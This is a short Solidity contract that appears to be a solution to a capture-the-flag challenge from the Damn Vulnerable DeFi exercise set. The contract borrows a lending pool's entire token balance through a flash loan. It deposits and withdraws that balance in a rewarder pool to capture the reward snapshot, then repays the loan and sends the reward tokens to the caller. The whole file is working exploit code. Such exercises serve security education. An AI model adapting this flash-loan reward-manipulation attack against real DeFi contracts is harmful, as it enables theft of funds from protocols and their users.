// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import { RewardToken } from "./RewardToken.sol";

contract AttackRewarder {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool victim;
    RewardToken rewardToken;
    DamnValuableToken liquidityToken;

    constructor(address _flash, address _victim, address _rewardToken, address _liquidityToken) {
        flashLoanPool = FlashLoanerPool(_flash);
        victim = TheRewarderPool(_victim);
        rewardToken = RewardToken(_rewardToken);
        liquidityToken = DamnValuableToken(_liquidityToken);
    }

    function attack() external returns (bool) {
        flashLoanPool.flashLoan(
            liquidityToken.balanceOf(address(flashLoanPool))
        );

        rewardToken.transfer(
            msg.sender,
            rewardToken.balanceOf(address(this))
        );
        return true;
    }

    function receiveFlashLoan(uint256) external returns (bool) {
        uint toDeposit = liquidityToken.balanceOf(address(this));

        liquidityToken.approve(address(victim), toDeposit);
    
        // Deposit to mark out spot.
        victim.deposit(toDeposit);
        victim.withdraw(toDeposit);
        
        // return DVT to Flash loan pool to prevent revert.
        liquidityToken.transfer(
            address(flashLoanPool),
            toDeposit
        );

        return true;
    }
}